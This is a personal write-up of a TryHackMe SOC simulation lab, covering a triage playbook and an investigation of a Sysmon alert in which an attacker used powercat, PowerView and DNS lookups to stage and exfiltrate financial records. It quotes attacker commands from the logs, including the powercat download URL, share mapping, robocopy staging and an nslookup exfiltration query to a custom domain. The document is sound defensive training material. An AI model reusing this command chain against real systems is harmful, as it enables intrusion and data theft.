# Phishing Unfolding - SOC Simulator | TryHackMe

## Overview
Dive into the heat of a live phishing attack as it unfolds within the corporate network. In this high-pressure scenario, your role is to meticulously analyze and document each phase of the breach as it happens.

## Lab Context
- Room: TryHackMe SOC Sim – Phishing Unfolding (`https://tryhackme.com/soc-sim/alert-queue`)
- Tools: SOC Dashboard, SIEM (Splunk), Analyst VM, TryDetectThis
- Role: Triage alerts, validate in SIEM, classify (TP/FP), and escalate when required.
- Prep: Read Alert Triage Playbook, Alert Classification, Case Reporting, and SOC notes (assets/employees).

## Workflow (playbook recap)
### Initial Alert Review
- Access SOC dashboard and open new alerts.
- Assign the first/earliest alert to yourself.
- Read alert description/logic; note provided IOCs (IPs, domains, URLs, hashes).

### Investigate in SIEM
- Query related logs to build a timeline and add context.
- Use Analyst VM + TryDetectThis to score domains/URLs/IPs/hashes.
- Correlate findings across sources to validate credibility.

### Resolution and Closure
- Choose classification per guide: True Positive vs False Positive.
- Write the case report (what, where, when, who, why TP/FP).
- Decide if escalation is required (see below).
- Submit and close the alert in the SOC dashboard.

## Alert Classification (essentials)
- **True Positive (TP):** Unauthorized access, malware/phishing, brute force, account breach, or policy violation.
- **False Positive (FP):** Benign/expected activity; may indicate rule tuning or misconfig.
- Examples:
  - Rule “Windows Account Brute Force”: TP if attacker or unapproved contractor brute forces; FP if misconfig or expired password retries.
  - Rule “Login from Unfamiliar Location”: TP if attacker/VPN abuse; FP if expected travel or approved VPN.

## Escalation Guidance
- Escalate TP when remediation is needed or alert is part of an incident chain.
- No escalation needed if blocked/quarantined before impact (e.g., mail server quarantined phishing before user access, AV removed installer pre-execution, benign scans with no effect).
- Escalation needed if host access occurred (e.g., scans from a breached host, credential dumping attempts, misclassified part of a larger chain).

## Alert Reporting Checklist
- Why TP or FP (clear justification).
- Whether escalation is required and remediation suggested.
- Entities: who/what was affected, where it occurred, when it happened.
- IOCs: network (IPs, ports, domains, URLs), host (file names/paths/hashes, signatures).
- Threat goals and (optional) MITRE mapping.


# Incident Analysis -- Alert 1025 (High Severity)

**Type:** Suspicious Process\
**Data Source:** Sysmon\
**Host:** `win-3450`\
**Timestamp:** `12/01/2025 06:05:44.270`

## Overview

This document summarizes how I investigated and responded to a
high-severity alert related to a suspicious process execution on host
**win-3450**. The goal is to provide a clear narrative of my thought
process---what drew my attention, why I followed certain leads, and how
I concluded that the host was compromised and undergoing active data
exfiltration.

As usual, I reviewed alerts **from newest to oldest**, and **by
severity**, starting with **High**, then Medium, then Low. Alert
**1025**, marked as *High*, was the case I assigned to myself.

## 1. Initial Alert Review

The alert described a **suspicious parent--child process relationship**:

-   **Child process:** `nslookup.exe`\
-   **Parent process:** `powershell.exe`\
-   **Command line:**\
    `C:\Windows\system32\nslookup.exe UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io`\
-   **Working directory:**\
    `C:\Users\michael.ascot\downloads\exfiltration\`

![Alert](assets/images/Screenshot%20from%202025-12-01%2001-17-17.png)

This immediately stood out. `nslookup.exe` launched from PowerShell is
unusual, especially when querying a strange, custom domain
(`haz4rdw4re.io`). Even more suspicious was the working directory: a
folder literally named **exfiltration**. This indicated that this alert
required deeper investigation.

## 2. Expanding the Investigation

I pivoted to Splunk to understand how we reached the point where
`nslookup.exe` was being used.\
I filtered all PowerShell executions on the host using:

    process.name="powershell.exe" host.name="win-3450"


![Alert](assets/images/Screenshot%20from%202025-12-01%2001-17-39.png)

This allowed me to reconstruct an accurate timeline of events leading up
to the alert.

## 3. Reconstruction of the Attack Timeline

### **06:00 UTC -- Reverse Shell Setup**

A PowerShell command performed a DNS query to:

    2.tcp.ngrok.io

![Alert](assets/images/Screenshot%20from%202025-12-01%2001-19-07.png)

VirusTotal flagged this domain as **malicious**.

![Alert](assets/images/Screenshot%20from%202025-12-01%2001-23-46.png)

Immediately afterward, a script downloaded:

    powercat.ps1

    hxxps[://]raw[.]githubusercontent[.]com/besimorhino/powercat/master/powercat[.]ps1

![Alert](assets/images/Screenshot%20from%202025-12-01%2001-25-00.png)

`powercat.ps1` is widely used to establish **reverse shells**.

**Conclusion:** A threat actor gained remote access to `win-3450`.

### **06:02 UTC -- System Reconnaissance**

A PowerShell script executed:

    C:\Users\michael.ascot\downloads\PowerView.ps1

![Alert](assets/images/Screenshot%20from%202025-12-01%2001-38-32.png)

`PowerView` is a tool for enumerating systems, permissions, and domain
details.

**Conclusion:** The attacker began gathering intelligence on the
environment.

### **06:03 UTC -- Accessing Sensitive Network Drive**

The attacker mapped a network drive:

    "C:\Windows\system32\net.exe" use Z: \\FILESRV-01\SSF-FinancialRecords

This location contains confidential financial records.

**Conclusion:** The attacker successfully located and accessed
high-value data.

### **06:04 UTC -- Data Staging**

Two actions occurred:

1.  Data copied using:

        robocopy.exe Z:\ C:\Users\michael.ascot\downloads\exfiltration

2.  Network drive Z: unmapped immediately afterward.

**Conclusion:** Sensitive data was staged locally for exfiltration.

![Alert](assets/images/Screenshot%20from%202025-12-01%2001-38-45.png)

### **06:05 UTC -- Packaging and Exfiltration**

A ZIP archive was created:\
`C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip`

Then the alert-triggering command executed:

    nslookup.exe UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io

The domain appears intentionally crafted for covert exfiltration, likely
leveraging DNS queries.

**Conclusion:** The attacker began the exfiltration phase.

![Alert](assets/images/Screenshot%20from%202025-12-01%2001-38-53.png)

## 4. Assessment and Final Determination

After correlating all activity:

-   The host was compromised via a malicious PowerShell download
    (`powercat.ps1`).
-   The attacker performed reconnaissance using `PowerView`.
-   Sensitive financial records were accessed and staged.
-   A ZIP archive was created.
-   A DNS-based exfiltration attempt was initiated.

This attack could have caused **major financial,
legal, and reputational damage**.

## 5. Action Taken

I immediately:

1.  **Escalated the alert** to the incident response team.\
2.  **Recommended isolating** host `win-3450` to contain the threat.
3.  **Recommended to block domain, url and files listed** to contain the attack.

![Alert](assets/images/Screenshot%20from%202025-12-01%2002-12-14.png)
![Alert](assets/images/Screenshot%20from%202025-12-01%2002-42-05.png)

## 6. Conclusion

Alert 1025 represented an advanced stage of a multi-step attack chain
involving:

-   Reverse shell access\
-   Reconnaissance\
-   Access to sensitive financial data\
-   Local staging\
-   DNS-based exfiltration attempts

Correlating Sysmon and Splunk data allowed me to determine the full
scope of compromise and act quickly to prevent further damage.

The simulation didn't stop here, this is a summary of my though process when resolving one of the most severe alert in the simulation.

I succesfuly completed the SOC simulation, and finished with a decent Mean Time To Respond of 4 min. 

![Alert](assets/images/Screenshot%20from%202025-12-01%2002-47-33.png)

Those real life simulation are challenging and they really help me to adapt to real life situations. Next, more real life simulation projects to strengthen my in alert triage skills.
